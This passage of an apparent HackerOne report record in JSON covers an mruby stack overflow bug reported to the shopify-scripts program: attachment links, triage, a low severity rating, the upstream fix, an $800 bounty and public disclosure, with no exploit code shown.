Q82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=8e1a7e52ac0cb2bfd7e6d76cfac9308bfcdc18d8ea744f6c121aaad2cb2e2f05"},{"id":145929,"filename":"mirb-stack-overflow.log","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/929/6363d935355b7f942033f9173b2767420b6eba21/mirb-stack-overflow.log?response-content-disposition=attachment%3B%20filename%3D%22mirb-stack-overflow.log%22%3B%20filename%2A%3DUTF-8%27%27mirb-stack-overflow.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=f1c9b0abef19f41fc38de02ce77aeb2f965822c2f4817e61f9f1dffbdb10c0c8"},{"id":145928,"filename":"mrb_check_intern_str_stackoverflow.rb","type":"text/x-c++","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/928/24865a352e3c2effc29ba971ce04440669ea2c48/mrb_check_intern_str_stackoverflow.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_check_intern_str_stackoverflow.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_check_intern_str_stackoverflow.rb\u0026response-content-type=text%2Fx-c%2B%2B\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvSP%2Bzn9VyHRQJZnA1hWcpkteF706gKj%2FXnieX9VW%2FOBOoEUExU1kfEmA0ZpoQRXSm8ma7vzsQoYhwoevAvKutaOvkhM8WM71tgT1%2FjC27FmA%2F%2FsDsAjQs2Rv9IujFElYACO0n6OSheOZw%3D%3D\u0026X-Amz-Signature=b2ca54795bd64161018317c37347bf2041b4979665da4da1b1b128b825e11ada"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1402401,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and opened an issue upstream: https://github.com/mruby/mruby/issues/3372","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3372\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3372\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3372\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-05T19:00:16.653Z","updated_at":"2017-01-05T19:00:16.653Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1402403,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-05T19:00:25.318Z","updated_at":"2017-01-05T19:00:25.318Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":17667},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1438324,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. The original issue you reported has been fixed upstream in https://github.com/mruby/mruby/pull/3377. The two subsequent PoC's now result in stack overflows, an issue which was already known to us (i.e. duplicate of #189633).\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. The original issue you reported has been fixed upstream in \u003ca title=\"https://github.com/mruby/mruby/pull/3377\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3377\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/pull/3377\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The two subsequent PoC\u0026#39;s now result in stack overflows, an issue which was already known to us (i.e. duplicate of \u003ca href=\"/reports/189633\"\u003e#189633\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T14:37:44.934Z","updated_at":"2017-01-23T14:37:44.934Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1452703,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the Mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify and the Mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-30T21:34:08.570Z","updated_at":"2017-01-30T21:34:08.570Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1452704,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-30T21:34:15.167Z","updated_at":"2017-01-30T21:34:15.167Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467906,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for bounty.","markdown_message":"\u003cp\u003eThanks for bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T08:52:01.829Z","updated_at":"2017-02-07T08:52:01.829Z","actor":{"username":"ston3","cleared":false,"url":"/ston3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1514367,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-01T21:34:23.849Z","updated_at":"2017-03-01T21:34:23.849Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}